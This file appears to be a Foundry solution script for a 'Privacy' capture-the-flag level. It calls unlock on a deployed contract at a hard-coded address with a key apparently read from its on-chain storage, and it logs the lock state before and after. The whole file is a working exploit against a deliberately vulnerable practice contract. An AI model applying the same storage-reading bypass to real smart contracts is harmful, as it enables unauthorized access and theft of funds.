// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyHack is Script {
    Privacy public privacy =
        Privacy(payable(0x46680C96b49008e5BDd58fAED391e7Acb5A87ad9));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Is contract locked before hack", privacy.locked());

        privacy.unlock(0x977e9b5d6e893689ab56b0df13734062);
        console.log("Is contract locked after hack", privacy.locked());

        vm.stopBroadcast();
    }
}

// forge script script/Privacy.s.sol -vv --tc PrivacyHack
// forge script script/Privacy.s.sol -vv --tc PrivacyHack --broadcast
